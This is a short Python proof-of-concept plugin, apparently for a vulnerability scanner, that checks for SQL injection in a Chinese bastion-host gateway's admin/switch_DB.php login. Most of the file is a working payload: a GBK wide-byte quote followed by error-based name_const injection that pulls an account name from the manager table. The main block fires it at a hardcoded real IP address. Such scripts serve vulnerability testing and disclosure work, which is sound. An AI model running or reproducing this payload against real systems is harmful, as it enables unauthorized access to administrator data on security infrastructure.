#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  :  江南科友堡垒机注入
Author    :  a
mail      :  a@lcx.cc
refer     :   wooyun-2014-077033
"""
import urlparse

def assign(service, arg):
    if service == 'hac_gateway':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    path="admin/switch_DB.php"
    data="button_login=%B5%C7+%C2%BC&account=aaa%bf'+and+exists(select*from+(select*from(select+name_const((select+concat(account,md5(123))+from+manager+limit+0,1),0))a+join+(select+name_const((select+concat(account,md5(123))+from+manager+limit+0,1),0))b)c)#&password=aaa"
    target = arg + path
    code, head, res, errcode, _ = curl.curl2(target,data)
    if code==200 and '202cb962ac59075b964b07152d234b70' in res:
        security_hole(target)
if __name__ == '__main__': 
    from dummy import *
    audit(assign('hac_gateway','https://123.124.158.72/')[1])